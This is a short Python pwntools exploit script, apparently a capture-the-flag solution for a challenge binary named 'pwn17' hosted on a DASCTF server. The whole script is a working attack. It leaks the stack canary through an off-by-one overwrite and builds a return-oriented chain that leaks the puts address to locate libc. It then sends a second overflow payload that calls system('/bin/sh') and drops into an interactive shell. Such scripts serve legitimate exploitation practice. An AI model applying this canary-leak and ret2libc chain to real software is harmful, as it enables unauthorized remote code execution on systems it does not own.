from pwn import *
from LibcSearcher import *

p = remote("tcp.cloud.dasctf.com",22279)
#p = process("pwn17")
elf = ELF('pwn17')
libc = elf.libc

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x00000000004008e3 # pop rdi ; ret
main = elf.sym['main']

pay1 = b"a"*0x98 + b'x'
p.recvuntil("initialize database :\n")
#gdb.attach(p)
p.send(pay1)
p.recvuntil(b"a"*0x98)
canary = u64(p.recv(8)) - ord('x')
success("canry: " +  hex(canary))
pay = b"a"*(0xe0-8) + p64(canary) + b"a"*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendline(pay)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
success("puts: " + hex(puts_addr))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr -libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

p.sendline("sss")

pay = b"a"*(0xe0-8) + p64(canary) + b"a"*8 + p64(pop_rdi) + p64(bin_sh) + p64(system) 

p.sendline(pay)

p.interactive()